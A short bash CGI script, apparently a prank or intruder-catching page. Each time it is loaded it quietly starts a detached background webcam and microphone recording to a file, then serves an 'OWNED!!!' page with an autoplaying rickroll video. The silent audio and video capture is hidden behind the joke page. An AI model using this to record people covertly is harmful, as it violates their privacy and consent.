#!/bin/bash

source conf.sh

file=$(mktemp --tmpdir=${VIDEOS_DIRECTORY} --suffix .mp4)
nohup bash -c "avconv -f video4linux2 -r 25 -i /dev/video0 -f alsa -i pulse -ar  22050 -ab 64k -strict experimental -acodec aac -vcodec mpeg4 -loglevel quiet -y -t $VIDEO_LENGTH $file </dev/null >/dev/null 2>&1" >/dev/null 2>&1 </dev/null &
echo -e "Content-type: text/html\n"

echo "<html>"
echo "<head><title>OWNED!!!</title>"
echo '<script async src="/lock.cgi"></script>'
echo '</head>'
echo '<body background="http://i.imgur.com/DOUpdwv.gif">'
echo '<center>'
echo '<iframe width="800" height="600" src="//www.youtube.com/embed/dQw4w9WgXcQ?rel=0&autoplay=1" frameborder="0" allowfullscreen>'
echo '</center>'
echo "</body>"
echo "</html>"

